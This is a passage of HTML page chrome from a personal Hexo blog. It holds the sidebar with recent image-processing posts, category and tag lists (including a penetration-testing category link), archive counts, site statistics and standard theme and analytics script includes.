/images/tianxiwei1.HPG"></div></a><div class="content"><a class="title" href="/BUAA/imgProc/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E7%83%A4%E6%BC%86%E6%80%BB%E7%BB%93/" title="imgProc-烤漆总结">imgProc-烤漆总结</a><time datetime="2024-01-18T09:46:05.000Z" title="发表于 2024-01-18 17:46:05">2024-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/BUAA/imgProc/ex4/" title="imgProc-ex4"><img src="/images/syq2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="imgProc-ex4"/></a><div class="content"><a class="title" href="/BUAA/imgProc/ex4/" title="imgProc-ex4">imgProc-ex4</a><time datetime="2024-01-18T09:46:04.000Z" title="发表于 2024-01-18 17:46:04">2024-01-18</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a>
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/BUAA/"><span class="card-category-list-name">BUAA</span><span class="card-category-list-count">14</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/BUAA/DBSEC/"><span class="card-category-list-name">DBSEC</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/BUAA/blockchain/"><span class="card-category-list-name">blockchain</span><span class="card-category-list-count">6</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/BUAA/crypto/"><span class="card-category-list-name">crypto</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/BUAA/imgProc/"><span class="card-category-list-name">imgProc</span><span class="card-category-list-count">5</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/BUAA/severityProtocol/"><span class="card-category-list-name">severityProtocol</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/kali/"><span class="card-category-list-name">kali</span><span class="card-category-list-count">1</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/kali/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="card-category-list-name">渗透测试</span><span class="card-category-list-count">1</span></a></li></ul></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/ssh/" style="font-size: 1.15em; color: rgb(109, 15, 68)">ssh</a><a href="/tags/mysql/" style="font-size: 1.15em; color: rgb(133, 84, 89)">mysql</a><a href="/tags/git/" style="font-size: 1.15em; color: rgb(27, 64, 180)">git</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.15em; color: rgb(40, 32, 150)">渗透测试</a><a href="/tags/python/" style="font-size: 1.15em; color: rgb(146, 141, 151)">python</a><a href="/tags/DBSEC/" style="font-size: 1.15em; color: rgb(140, 117, 140)">DBSEC</a><a href="/tags/imgProc/" style="font-size: 1.3em; color: rgb(52, 77, 55)">imgProc</a><a href="/tags/blockchain/" style="font-size: 1.45em; color: rgb(122, 2, 197)">blockchain</a><a href="/tags/crypto/" style="font-size: 1.15em; color: rgb(24, 142, 70)">crypto</a><a href="/tags/severityProtocol/" style="font-size: 1.15em; color: rgb(134, 17, 119)">severityProtocol</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">17</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">2</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">19</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2023-11-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">42.1k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-22T15:40:00.722Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By £·</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://lzh594.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
